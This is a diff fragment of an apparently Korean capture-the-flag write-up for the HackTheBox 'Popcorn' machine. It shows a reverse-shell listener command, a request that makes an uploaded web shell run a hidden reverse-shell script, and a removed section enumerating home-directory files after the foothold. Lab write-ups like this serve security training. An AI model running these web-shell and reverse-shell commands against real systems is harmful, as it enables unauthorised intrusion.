@@ -178,27 +178,3 @@ python tcp_pty_shell_handler.py -b 192.168.87.132:31337
 GET /shell.php?shin=python /var/www/html/uploads/.rev.py HTTP/1.1
 ```
 
-## username 확인
----
-[http://man7.org/linux/man-pages/man1/find.1.html](http://man7.org/linux/man-pages/man1/find.1.html)
-
-```bash
-www-data@popcorn:/var/www/torrent/upload$find /home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null| column -t
-```
-
-|filename|path|user|group|file permission(m)|
-|------------|-------------|-------------|-------------|-------------|
-|home                       | /home                                     |root  |  root   | 755|
-|george                     | /home/george                              |george|  george | 755|
-|.bash_logout               | /home/george/.bash_logout                 |george|  george | 644|
-|.bashrc                    | /home/george/.bashrc                      |george|  george | 644|
-|torrenthoster.zip          | /home/george/torrenthoster.zip            |george|  george | 644|
-|.cache                     | /home/george/.cache                       |george|  george | 755|
-|motd.legal-displayed       | /home/george/.cache/motd.legal-displayed  |george|  george | 644|
-|.sudo_as_admin_successful  | /home/george/.sudo_as_admin_successful    |george|  george | 644|
-|user.txt                   | /home/george/user.txt                     |george|  george | 644|
-|.nano_history              | /home/george/.nano_history                |root  |  root   | 600|
-|.mysql_history             | /home/george/.mysql_history               |root  |  root   | 600|
-|.bash_history              | /home/george/.bash_history                |root  |  root   | 600|
-|.profile                   | /home/george/.profile                     |george|  george | 644|
-
